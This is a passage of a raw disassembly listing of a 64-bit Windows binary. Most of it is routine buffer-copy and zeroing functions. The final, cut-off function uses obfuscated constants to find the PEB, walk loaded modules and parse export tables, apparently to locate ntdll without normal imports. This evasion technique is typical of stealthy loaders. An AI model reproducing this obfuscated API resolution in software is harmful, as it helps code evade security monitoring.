   140009b7a:	66 89 05 df 72 2b 00 	mov    %ax,0x2b72df(%rip)        # 0x1402c0e60
   140009b81:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140009b85:	66 89 05 d6 72 2b 00 	mov    %ax,0x2b72d6(%rip)        # 0x1402c0e62
   140009b8c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140009b90:	66 89 05 cd 72 2b 00 	mov    %ax,0x2b72cd(%rip)        # 0x1402c0e64
   140009b97:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140009b9b:	66 89 05 c4 72 2b 00 	mov    %ax,0x2b72c4(%rip)        # 0x1402c0e66
   140009ba2:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140009ba6:	66 89 05 bb 72 2b 00 	mov    %ax,0x2b72bb(%rip)        # 0x1402c0e68
   140009bad:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140009bb1:	66 89 05 b2 72 2b 00 	mov    %ax,0x2b72b2(%rip)        # 0x1402c0e6a
   140009bb8:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   140009bbc:	66 89 05 a9 72 2b 00 	mov    %ax,0x2b72a9(%rip)        # 0x1402c0e6c
   140009bc3:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140009bc7:	66 89 05 a0 72 2b 00 	mov    %ax,0x2b72a0(%rip)        # 0x1402c0e6e
   140009bce:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140009bd2:	66 89 05 97 72 2b 00 	mov    %ax,0x2b7297(%rip)        # 0x1402c0e70
   140009bd9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   140009bdd:	66 89 05 8e 72 2b 00 	mov    %ax,0x2b728e(%rip)        # 0x1402c0e72
   140009be4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140009be8:	66 89 05 85 72 2b 00 	mov    %ax,0x2b7285(%rip)        # 0x1402c0e74
   140009bef:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140009bf3:	66 89 05 7c 72 2b 00 	mov    %ax,0x2b727c(%rip)        # 0x1402c0e76
   140009bfa:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   140009bfe:	66 89 05 73 72 2b 00 	mov    %ax,0x2b7273(%rip)        # 0x1402c0e78
   140009c05:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140009c09:	66 89 05 6a 72 2b 00 	mov    %ax,0x2b726a(%rip)        # 0x1402c0e7a
   140009c10:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140009c14:	66 89 05 61 72 2b 00 	mov    %ax,0x2b7261(%rip)        # 0x1402c0e7c
   140009c1b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   140009c1f:	66 89 05 58 72 2b 00 	mov    %ax,0x2b7258(%rip)        # 0x1402c0e7e
   140009c26:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   140009c2a:	66 89 05 4f 72 2b 00 	mov    %ax,0x2b724f(%rip)        # 0x1402c0e80
   140009c31:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140009c35:	66 89 05 46 72 2b 00 	mov    %ax,0x2b7246(%rip)        # 0x1402c0e82
   140009c3c:	c3                   	ret
   140009c3d:	cc                   	int3
   140009c3e:	cc                   	int3
   140009c3f:	cc                   	int3
   140009c40:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009c43:	0f 29 05 26 72 2b 00 	movaps %xmm0,0x2b7226(%rip)        # 0x1402c0e70
   140009c4a:	0f 29 05 0f 72 2b 00 	movaps %xmm0,0x2b720f(%rip)        # 0x1402c0e60
   140009c51:	c7 05 25 72 2b 00 00 	movl   $0x0,0x2b7225(%rip)        # 0x1402c0e80
   140009c58:	00 00 00 
   140009c5b:	c3                   	ret
   140009c5c:	cc                   	int3
   140009c5d:	cc                   	int3
   140009c5e:	cc                   	int3
   140009c5f:	cc                   	int3
   140009c60:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009c63:	0f 29 05 26 72 2b 00 	movaps %xmm0,0x2b7226(%rip)        # 0x1402c0e90
   140009c6a:	48 c7 05 2b 72 2b 00 	movq   $0x0,0x2b722b(%rip)        # 0x1402c0ea0
   140009c71:	00 00 00 00 
   140009c75:	c3                   	ret
   140009c76:	cc                   	int3
   140009c77:	cc                   	int3
   140009c78:	cc                   	int3
   140009c79:	cc                   	int3
   140009c7a:	cc                   	int3
   140009c7b:	cc                   	int3
   140009c7c:	cc                   	int3
   140009c7d:	cc                   	int3
   140009c7e:	cc                   	int3
   140009c7f:	cc                   	int3
   140009c80:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009c83:	0f 29 05 26 72 2b 00 	movaps %xmm0,0x2b7226(%rip)        # 0x1402c0eb0
   140009c8a:	48 c7 05 2b 72 2b 00 	movq   $0x0,0x2b722b(%rip)        # 0x1402c0ec0
   140009c91:	00 00 00 00 
   140009c95:	c3                   	ret
   140009c96:	cc                   	int3
   140009c97:	cc                   	int3
   140009c98:	cc                   	int3
   140009c99:	cc                   	int3
   140009c9a:	cc                   	int3
   140009c9b:	cc                   	int3
   140009c9c:	cc                   	int3
   140009c9d:	cc                   	int3
   140009c9e:	cc                   	int3
   140009c9f:	cc                   	int3
   140009ca0:	c6 05 6f 72 2b 00 01 	movb   $0x1,0x2b726f(%rip)        # 0x1402c0f16
   140009ca7:	0f b7 01             	movzwl (%rcx),%eax
   140009caa:	66 89 05 1f 72 2b 00 	mov    %ax,0x2b721f(%rip)        # 0x1402c0ed0
   140009cb1:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140009cb5:	66 89 05 16 72 2b 00 	mov    %ax,0x2b7216(%rip)        # 0x1402c0ed2
   140009cbc:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140009cc0:	66 89 05 0d 72 2b 00 	mov    %ax,0x2b720d(%rip)        # 0x1402c0ed4
   140009cc7:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140009ccb:	66 89 05 04 72 2b 00 	mov    %ax,0x2b7204(%rip)        # 0x1402c0ed6
   140009cd2:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140009cd6:	66 89 05 fb 71 2b 00 	mov    %ax,0x2b71fb(%rip)        # 0x1402c0ed8
   140009cdd:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140009ce1:	66 89 05 f2 71 2b 00 	mov    %ax,0x2b71f2(%rip)        # 0x1402c0eda
   140009ce8:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   140009cec:	66 89 05 e9 71 2b 00 	mov    %ax,0x2b71e9(%rip)        # 0x1402c0edc
   140009cf3:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140009cf7:	66 89 05 e0 71 2b 00 	mov    %ax,0x2b71e0(%rip)        # 0x1402c0ede
   140009cfe:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140009d02:	66 89 05 d7 71 2b 00 	mov    %ax,0x2b71d7(%rip)        # 0x1402c0ee0
   140009d09:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   140009d0d:	66 89 05 ce 71 2b 00 	mov    %ax,0x2b71ce(%rip)        # 0x1402c0ee2
   140009d14:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140009d18:	66 89 05 c5 71 2b 00 	mov    %ax,0x2b71c5(%rip)        # 0x1402c0ee4
   140009d1f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140009d23:	66 89 05 bc 71 2b 00 	mov    %ax,0x2b71bc(%rip)        # 0x1402c0ee6
   140009d2a:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   140009d2e:	66 89 05 b3 71 2b 00 	mov    %ax,0x2b71b3(%rip)        # 0x1402c0ee8
   140009d35:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140009d39:	66 89 05 aa 71 2b 00 	mov    %ax,0x2b71aa(%rip)        # 0x1402c0eea
   140009d40:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140009d44:	66 89 05 a1 71 2b 00 	mov    %ax,0x2b71a1(%rip)        # 0x1402c0eec
   140009d4b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   140009d4f:	66 89 05 98 71 2b 00 	mov    %ax,0x2b7198(%rip)        # 0x1402c0eee
   140009d56:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   140009d5a:	66 89 05 8f 71 2b 00 	mov    %ax,0x2b718f(%rip)        # 0x1402c0ef0
   140009d61:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140009d65:	66 89 05 86 71 2b 00 	mov    %ax,0x2b7186(%rip)        # 0x1402c0ef2
   140009d6c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140009d70:	66 89 05 7d 71 2b 00 	mov    %ax,0x2b717d(%rip)        # 0x1402c0ef4
   140009d77:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   140009d7b:	66 89 05 74 71 2b 00 	mov    %ax,0x2b7174(%rip)        # 0x1402c0ef6
   140009d82:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140009d86:	66 89 05 6b 71 2b 00 	mov    %ax,0x2b716b(%rip)        # 0x1402c0ef8
   140009d8d:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   140009d91:	66 89 05 62 71 2b 00 	mov    %ax,0x2b7162(%rip)        # 0x1402c0efa
   140009d98:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   140009d9c:	66 89 05 59 71 2b 00 	mov    %ax,0x2b7159(%rip)        # 0x1402c0efc
   140009da3:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   140009da7:	66 89 05 50 71 2b 00 	mov    %ax,0x2b7150(%rip)        # 0x1402c0efe
   140009dae:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   140009db2:	66 89 05 47 71 2b 00 	mov    %ax,0x2b7147(%rip)        # 0x1402c0f00
   140009db9:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   140009dbd:	66 89 05 3e 71 2b 00 	mov    %ax,0x2b713e(%rip)        # 0x1402c0f02
   140009dc4:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   140009dc8:	66 89 05 35 71 2b 00 	mov    %ax,0x2b7135(%rip)        # 0x1402c0f04
   140009dcf:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   140009dd3:	66 89 05 2c 71 2b 00 	mov    %ax,0x2b712c(%rip)        # 0x1402c0f06
   140009dda:	0f b7 41 38          	movzwl 0x38(%rcx),%eax
   140009dde:	66 89 05 23 71 2b 00 	mov    %ax,0x2b7123(%rip)        # 0x1402c0f08
   140009de5:	0f b7 41 3a          	movzwl 0x3a(%rcx),%eax
   140009de9:	66 89 05 1a 71 2b 00 	mov    %ax,0x2b711a(%rip)        # 0x1402c0f0a
   140009df0:	0f b7 41 3c          	movzwl 0x3c(%rcx),%eax
   140009df4:	66 89 05 11 71 2b 00 	mov    %ax,0x2b7111(%rip)        # 0x1402c0f0c
   140009dfb:	0f b7 41 3e          	movzwl 0x3e(%rcx),%eax
   140009dff:	66 89 05 08 71 2b 00 	mov    %ax,0x2b7108(%rip)        # 0x1402c0f0e
   140009e06:	0f b7 41 40          	movzwl 0x40(%rcx),%eax
   140009e0a:	66 89 05 ff 70 2b 00 	mov    %ax,0x2b70ff(%rip)        # 0x1402c0f10
   140009e11:	0f b7 41 42          	movzwl 0x42(%rcx),%eax
   140009e15:	66 89 05 f6 70 2b 00 	mov    %ax,0x2b70f6(%rip)        # 0x1402c0f12
   140009e1c:	0f b7 41 44          	movzwl 0x44(%rcx),%eax
   140009e20:	66 89 05 ed 70 2b 00 	mov    %ax,0x2b70ed(%rip)        # 0x1402c0f14
   140009e27:	c3                   	ret
   140009e28:	cc                   	int3
   140009e29:	cc                   	int3
   140009e2a:	cc                   	int3
   140009e2b:	cc                   	int3
   140009e2c:	cc                   	int3
   140009e2d:	cc                   	int3
   140009e2e:	cc                   	int3
   140009e2f:	cc                   	int3
   140009e30:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009e33:	0f 29 05 c6 70 2b 00 	movaps %xmm0,0x2b70c6(%rip)        # 0x1402c0f00
   140009e3a:	0f 29 05 af 70 2b 00 	movaps %xmm0,0x2b70af(%rip)        # 0x1402c0ef0
   140009e41:	0f 29 05 98 70 2b 00 	movaps %xmm0,0x2b7098(%rip)        # 0x1402c0ee0
   140009e48:	0f 29 05 81 70 2b 00 	movaps %xmm0,0x2b7081(%rip)        # 0x1402c0ed0
   140009e4f:	48 c7 05 b4 70 2b 00 	movq   $0x0,0x2b70b4(%rip)        # 0x1402c0f0e
   140009e56:	00 00 00 00 
   140009e5a:	c3                   	ret
   140009e5b:	cc                   	int3
   140009e5c:	cc                   	int3
   140009e5d:	cc                   	int3
   140009e5e:	cc                   	int3
   140009e5f:	cc                   	int3
   140009e60:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009e63:	0f 29 05 b6 70 2b 00 	movaps %xmm0,0x2b70b6(%rip)        # 0x1402c0f20
   140009e6a:	48 c7 05 b9 70 2b 00 	movq   $0x0,0x2b70b9(%rip)        # 0x1402c0f2e
   140009e71:	00 00 00 00 
   140009e75:	c3                   	ret
   140009e76:	cc                   	int3
   140009e77:	cc                   	int3
   140009e78:	cc                   	int3
   140009e79:	cc                   	int3
   140009e7a:	cc                   	int3
   140009e7b:	cc                   	int3
   140009e7c:	cc                   	int3
   140009e7d:	cc                   	int3
   140009e7e:	cc                   	int3
   140009e7f:	cc                   	int3
   140009e80:	48 8d 0d b1 70 2b 00 	lea    0x2b70b1(%rip),%rcx        # 0x1402c0f38
   140009e87:	41 b8 54 09 00 00    	mov    $0x954,%r8d
   140009e8d:	31 d2                	xor    %edx,%edx
   140009e8f:	e9 4c 08 00 00       	jmp    0x14000a6e0
   140009e94:	cc                   	int3
   140009e95:	cc                   	int3
   140009e96:	cc                   	int3
   140009e97:	cc                   	int3
   140009e98:	cc                   	int3
   140009e99:	cc                   	int3
   140009e9a:	cc                   	int3
   140009e9b:	cc                   	int3
   140009e9c:	cc                   	int3
   140009e9d:	cc                   	int3
   140009e9e:	cc                   	int3
   140009e9f:	cc                   	int3
   140009ea0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009ea3:	0f 29 05 e6 79 2b 00 	movaps %xmm0,0x2b79e6(%rip)        # 0x1402c1890
   140009eaa:	48 c7 05 eb 79 2b 00 	movq   $0x0,0x2b79eb(%rip)        # 0x1402c18a0
   140009eb1:	00 00 00 00 
   140009eb5:	c3                   	ret
   140009eb6:	cc                   	int3
   140009eb7:	cc                   	int3
   140009eb8:	cc                   	int3
   140009eb9:	cc                   	int3
   140009eba:	cc                   	int3
   140009ebb:	cc                   	int3
   140009ebc:	cc                   	int3
   140009ebd:	cc                   	int3
   140009ebe:	cc                   	int3
   140009ebf:	cc                   	int3
   140009ec0:	c6 05 2f 7a 2b 00 01 	movb   $0x1,0x2b7a2f(%rip)        # 0x1402c18f6
   140009ec7:	0f b7 01             	movzwl (%rcx),%eax
   140009eca:	66 89 05 df 79 2b 00 	mov    %ax,0x2b79df(%rip)        # 0x1402c18b0
   140009ed1:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140009ed5:	66 89 05 d6 79 2b 00 	mov    %ax,0x2b79d6(%rip)        # 0x1402c18b2
   140009edc:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140009ee0:	66 89 05 cd 79 2b 00 	mov    %ax,0x2b79cd(%rip)        # 0x1402c18b4
   140009ee7:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140009eeb:	66 89 05 c4 79 2b 00 	mov    %ax,0x2b79c4(%rip)        # 0x1402c18b6
   140009ef2:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140009ef6:	66 89 05 bb 79 2b 00 	mov    %ax,0x2b79bb(%rip)        # 0x1402c18b8
   140009efd:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140009f01:	66 89 05 b2 79 2b 00 	mov    %ax,0x2b79b2(%rip)        # 0x1402c18ba
   140009f08:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   140009f0c:	66 89 05 a9 79 2b 00 	mov    %ax,0x2b79a9(%rip)        # 0x1402c18bc
   140009f13:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140009f17:	66 89 05 a0 79 2b 00 	mov    %ax,0x2b79a0(%rip)        # 0x1402c18be
   140009f1e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140009f22:	66 89 05 97 79 2b 00 	mov    %ax,0x2b7997(%rip)        # 0x1402c18c0
   140009f29:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   140009f2d:	66 89 05 8e 79 2b 00 	mov    %ax,0x2b798e(%rip)        # 0x1402c18c2
   140009f34:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140009f38:	66 89 05 85 79 2b 00 	mov    %ax,0x2b7985(%rip)        # 0x1402c18c4
   140009f3f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140009f43:	66 89 05 7c 79 2b 00 	mov    %ax,0x2b797c(%rip)        # 0x1402c18c6
   140009f4a:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   140009f4e:	66 89 05 73 79 2b 00 	mov    %ax,0x2b7973(%rip)        # 0x1402c18c8
   140009f55:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140009f59:	66 89 05 6a 79 2b 00 	mov    %ax,0x2b796a(%rip)        # 0x1402c18ca
   140009f60:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140009f64:	66 89 05 61 79 2b 00 	mov    %ax,0x2b7961(%rip)        # 0x1402c18cc
   140009f6b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   140009f6f:	66 89 05 58 79 2b 00 	mov    %ax,0x2b7958(%rip)        # 0x1402c18ce
   140009f76:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   140009f7a:	66 89 05 4f 79 2b 00 	mov    %ax,0x2b794f(%rip)        # 0x1402c18d0
   140009f81:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140009f85:	66 89 05 46 79 2b 00 	mov    %ax,0x2b7946(%rip)        # 0x1402c18d2
   140009f8c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140009f90:	66 89 05 3d 79 2b 00 	mov    %ax,0x2b793d(%rip)        # 0x1402c18d4
   140009f97:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   140009f9b:	66 89 05 34 79 2b 00 	mov    %ax,0x2b7934(%rip)        # 0x1402c18d6
   140009fa2:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140009fa6:	66 89 05 2b 79 2b 00 	mov    %ax,0x2b792b(%rip)        # 0x1402c18d8
   140009fad:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   140009fb1:	66 89 05 22 79 2b 00 	mov    %ax,0x2b7922(%rip)        # 0x1402c18da
   140009fb8:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   140009fbc:	66 89 05 19 79 2b 00 	mov    %ax,0x2b7919(%rip)        # 0x1402c18dc
   140009fc3:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   140009fc7:	66 89 05 10 79 2b 00 	mov    %ax,0x2b7910(%rip)        # 0x1402c18de
   140009fce:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   140009fd2:	66 89 05 07 79 2b 00 	mov    %ax,0x2b7907(%rip)        # 0x1402c18e0
   140009fd9:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   140009fdd:	66 89 05 fe 78 2b 00 	mov    %ax,0x2b78fe(%rip)        # 0x1402c18e2
   140009fe4:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   140009fe8:	66 89 05 f5 78 2b 00 	mov    %ax,0x2b78f5(%rip)        # 0x1402c18e4
   140009fef:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   140009ff3:	66 89 05 ec 78 2b 00 	mov    %ax,0x2b78ec(%rip)        # 0x1402c18e6
   140009ffa:	0f b7 41 38          	movzwl 0x38(%rcx),%eax
   140009ffe:	66 89 05 e3 78 2b 00 	mov    %ax,0x2b78e3(%rip)        # 0x1402c18e8
   14000a005:	0f b7 41 3a          	movzwl 0x3a(%rcx),%eax
   14000a009:	66 89 05 da 78 2b 00 	mov    %ax,0x2b78da(%rip)        # 0x1402c18ea
   14000a010:	0f b7 41 3c          	movzwl 0x3c(%rcx),%eax
   14000a014:	66 89 05 d1 78 2b 00 	mov    %ax,0x2b78d1(%rip)        # 0x1402c18ec
   14000a01b:	0f b7 41 3e          	movzwl 0x3e(%rcx),%eax
   14000a01f:	66 89 05 c8 78 2b 00 	mov    %ax,0x2b78c8(%rip)        # 0x1402c18ee
   14000a026:	0f b7 41 40          	movzwl 0x40(%rcx),%eax
   14000a02a:	66 89 05 bf 78 2b 00 	mov    %ax,0x2b78bf(%rip)        # 0x1402c18f0
   14000a031:	0f b7 41 42          	movzwl 0x42(%rcx),%eax
   14000a035:	66 89 05 b6 78 2b 00 	mov    %ax,0x2b78b6(%rip)        # 0x1402c18f2
   14000a03c:	0f b7 41 44          	movzwl 0x44(%rcx),%eax
   14000a040:	66 89 05 ad 78 2b 00 	mov    %ax,0x2b78ad(%rip)        # 0x1402c18f4
   14000a047:	c3                   	ret
   14000a048:	cc                   	int3
   14000a049:	cc                   	int3
   14000a04a:	cc                   	int3
   14000a04b:	cc                   	int3
   14000a04c:	cc                   	int3
   14000a04d:	cc                   	int3
   14000a04e:	cc                   	int3
   14000a04f:	cc                   	int3
   14000a050:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000a053:	0f 29 05 86 78 2b 00 	movaps %xmm0,0x2b7886(%rip)        # 0x1402c18e0
   14000a05a:	0f 29 05 6f 78 2b 00 	movaps %xmm0,0x2b786f(%rip)        # 0x1402c18d0
   14000a061:	0f 29 05 58 78 2b 00 	movaps %xmm0,0x2b7858(%rip)        # 0x1402c18c0
   14000a068:	0f 29 05 41 78 2b 00 	movaps %xmm0,0x2b7841(%rip)        # 0x1402c18b0
   14000a06f:	48 c7 05 74 78 2b 00 	movq   $0x0,0x2b7874(%rip)        # 0x1402c18ee
   14000a076:	00 00 00 00 
   14000a07a:	c3                   	ret
   14000a07b:	cc                   	int3
   14000a07c:	cc                   	int3
   14000a07d:	cc                   	int3
   14000a07e:	cc                   	int3
   14000a07f:	cc                   	int3
   14000a080:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000a083:	0f 29 05 76 78 2b 00 	movaps %xmm0,0x2b7876(%rip)        # 0x1402c1900
   14000a08a:	48 c7 05 79 78 2b 00 	movq   $0x0,0x2b7879(%rip)        # 0x1402c190e
   14000a091:	00 00 00 00 
   14000a095:	c3                   	ret
   14000a096:	cc                   	int3
   14000a097:	cc                   	int3
   14000a098:	cc                   	int3
   14000a099:	cc                   	int3
   14000a09a:	cc                   	int3
   14000a09b:	cc                   	int3
   14000a09c:	cc                   	int3
   14000a09d:	cc                   	int3
   14000a09e:	cc                   	int3
   14000a09f:	cc                   	int3
   14000a0a0:	48 8d 0d 71 78 2b 00 	lea    0x2b7871(%rip),%rcx        # 0x1402c1918
   14000a0a7:	41 b8 24 04 00 00    	mov    $0x424,%r8d
   14000a0ad:	31 d2                	xor    %edx,%edx
   14000a0af:	e9 2c 06 00 00       	jmp    0x14000a6e0
   14000a0b4:	cc                   	int3
   14000a0b5:	cc                   	int3
   14000a0b6:	cc                   	int3
   14000a0b7:	cc                   	int3
   14000a0b8:	cc                   	int3
   14000a0b9:	cc                   	int3
   14000a0ba:	cc                   	int3
   14000a0bb:	cc                   	int3
   14000a0bc:	cc                   	int3
   14000a0bd:	cc                   	int3
   14000a0be:	cc                   	int3
   14000a0bf:	cc                   	int3
   14000a0c0:	8d 81 d4 bc 5f e6    	lea    -0x19a0432c(%rcx),%eax
   14000a0c6:	c3                   	ret
   14000a0c7:	cc                   	int3
   14000a0c8:	cc                   	int3
   14000a0c9:	cc                   	int3
   14000a0ca:	cc                   	int3
   14000a0cb:	cc                   	int3
   14000a0cc:	cc                   	int3
   14000a0cd:	cc                   	int3
   14000a0ce:	cc                   	int3
   14000a0cf:	cc                   	int3
   14000a0d0:	41 57                	push   %r15
   14000a0d2:	41 56                	push   %r14
   14000a0d4:	41 55                	push   %r13
   14000a0d6:	41 54                	push   %r12
   14000a0d8:	56                   	push   %rsi
   14000a0d9:	57                   	push   %rdi
   14000a0da:	55                   	push   %rbp
   14000a0db:	53                   	push   %rbx
   14000a0dc:	48 83 ec 38          	sub    $0x38,%rsp
   14000a0e0:	89 ce                	mov    %ecx,%esi
   14000a0e2:	44 8b 2d 7f 61 2b 00 	mov    0x2b617f(%rip),%r13d        # 0x1402c0268
   14000a0e9:	45 85 ed             	test   %r13d,%r13d
   14000a0ec:	74 2d                	je     0x14000a11b
   14000a0ee:	48 8b 1d 7b 61 2b 00 	mov    0x2b617b(%rip),%rbx        # 0x1402c0270
   14000a0f5:	44 89 e8             	mov    %r13d,%eax
   14000a0f8:	31 ff                	xor    %edi,%edi
   14000a0fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   14000a100:	39 34 fb             	cmp    %esi,(%rbx,%rdi,8)
   14000a103:	0f 84 5d 02 00 00    	je     0x14000a366
   14000a109:	48 ff c7             	inc    %rdi
   14000a10c:	48 39 f8             	cmp    %rdi,%rax
   14000a10f:	75 ef                	jne    0x14000a100
   14000a111:	bf ff ff ff ff       	mov    $0xffffffff,%edi
   14000a116:	e9 4b 02 00 00       	jmp    0x14000a366
   14000a11b:	b9 8c 43 a0 19       	mov    $0x19a0438c,%ecx
   14000a120:	e8 9b ff ff ff       	call   0x14000a0c0
   14000a125:	89 c0                	mov    %eax,%eax
   14000a127:	65 48 8b 00          	mov    %gs:(%rax),%rax
   14000a12b:	48 8b 40 18          	mov    0x18(%rax),%rax
   14000a12f:	48 8b 58 10          	mov    0x10(%rax),%rbx
   14000a133:	4c 8b 6b 30          	mov    0x30(%rbx),%r13
   14000a137:	bf ff ff ff ff       	mov    $0xffffffff,%edi
   14000a13c:	4d 85 ed             	test   %r13,%r13
   14000a13f:	0f 84 21 02 00 00    	je     0x14000a366
   14000a145:	89 74 24 20          	mov    %esi,0x20(%rsp)
   14000a149:	b9 68 43 a0 19       	mov    $0x19a04368,%ecx
   14000a14e:	e8 6d ff ff ff       	call   0x14000a0c0
   14000a153:	41 89 c6             	mov    %eax,%r14d
   14000a156:	45 31 e4             	xor    %r12d,%r12d
   14000a159:	eb 14                	jmp    0x14000a16f
   14000a15b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000a160:	4d 89 ec             	mov    %r13,%r12
   14000a163:	48 8b 1b             	mov    (%rbx),%rbx
   14000a166:	4c 8b 6b 30          	mov    0x30(%rbx),%r13
   14000a16a:	4d 85 ed             	test   %r13,%r13
   14000a16d:	74 56                	je     0x14000a1c5
   14000a16f:	4d 89 ef             	mov    %r13,%r15
   14000a172:	43 8b 04 2e          	mov    (%r14,%r13,1),%eax
   14000a176:	46 8b ac 28 88 00 00 	mov    0x88(%rax,%r13,1),%r13d
   14000a17d:	00 
   14000a17e:	4d 85 ed             	test   %r13,%r13
   14000a181:	74 e0                	je     0x14000a163
   14000a183:	43 8b 6c 3d 0c       	mov    0xc(%r13,%r15,1),%ebp
   14000a188:	4d 01 fd             	add    %r15,%r13
   14000a18b:	46 8b 64 3d 00       	mov    0x0(%rbp,%r15,1),%r12d
   14000a190:	b9 9a b7 04 86       	mov    $0x8604b79a,%ecx
   14000a195:	e8 26 ff ff ff       	call   0x14000a0c0
   14000a19a:	41 39 c4             	cmp    %eax,%r12d
   14000a19d:	75 c1                	jne    0x14000a160
   14000a19f:	4c 01 fd             	add    %r15,%rbp
   14000a1a2:	4d 89 ec             	mov    %r13,%r12
   14000a1a5:	b9 30 43 a0 19       	mov    $0x19a04330,%ecx
   14000a1aa:	e8 11 ff ff ff       	call   0x14000a0c0
   14000a1af:	89 c0                	mov    %eax,%eax
   14000a1b1:	8b 6c 05 00          	mov    0x0(%rbp,%rax,1),%ebp
   14000a1b5:	b9 98 71 04 86       	mov    $0x86047198,%ecx
   14000a1ba:	e8 01 ff ff ff       	call   0x14000a0c0
   14000a1bf:	39 c5                	cmp    %eax,%ebp
   14000a1c1:	75 a0                	jne    0x14000a163
   14000a1c3:	eb 09                	jmp    0x14000a1ce
   14000a1c5:	4d 85 e4             	test   %r12,%r12
   14000a1c8:	0f 84 98 01 00 00    	je     0x14000a366
   14000a1ce:	4c 89 3d a3 7b 2b 00 	mov    %r15,0x2b7ba3(%rip)        # 0x1402c1d78
   14000a1d5:	b9 14 47 a0 19       	mov    $0x19a04714,%ecx
   14000a1da:	e8 e1 fe ff ff       	call   0x14000a0c0
   14000a1df:	89 c6                	mov    %eax,%esi
   14000a1e1:	89 c1                	mov    %eax,%ecx
   14000a1e3:	48 c1 e1 03          	shl    $0x3,%rcx
   14000a1e7:	e8 c4 03 00 00       	call   0x14000a5b0
   14000a1ec:	48 89 05 7d 60 2b 00 	mov    %rax,0x2b607d(%rip)        # 0x1402c0270
   14000a1f3:	41 8b 6c 24 18       	mov    0x18(%r12),%ebp
   14000a1f8:	85 ed                	test   %ebp,%ebp
   14000a1fa:	0f 84 5c 01 00 00    	je     0x14000a35c
   14000a200:	85 f6                	test   %esi,%esi
   14000a202:	0f 84 54 01 00 00    	je     0x14000a35c
   14000a208:	48 89 c3             	mov    %rax,%rbx
   14000a20b:	b9 4c 43 a0 19       	mov    $0x19a0434c,%ecx
   14000a210:	e8 ab fe ff ff       	call   0x14000a0c0
   14000a215:	89 c0                	mov    %eax,%eax
   14000a217:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000a21c:	b9 86 ba a0 19       	mov    $0x19a0ba86,%ecx
